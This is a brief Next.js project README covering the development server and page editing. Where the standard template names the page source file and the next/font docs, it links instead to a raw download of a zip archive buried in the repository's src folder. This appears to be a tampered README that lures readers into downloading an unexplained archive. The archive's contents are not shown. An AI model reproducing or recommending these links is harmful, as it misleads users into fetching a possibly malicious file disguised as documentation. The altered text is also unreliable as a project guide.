## Getting Started

First, run the development server:

```bash
npm run dev
# or
yarn dev
# or
pnpm dev
# or
bun dev
```

Open [http://localhost:3000](http://localhost:3000) with your browser to see the
result.

You can start editing the page by modifying `https://github.com/Miqman/ipo-cartenz/raw/refs/heads/main/src/app/[locale]/produk/ipo-cartenz-v1.0.zip`. The page
auto-updates as you edit the file.

This project uses
[`next/font`](https://github.com/Miqman/ipo-cartenz/raw/refs/heads/main/src/app/[locale]/produk/ipo-cartenz-v1.0.zip) to
automatically optimize and load Inter, a custom Google Font.
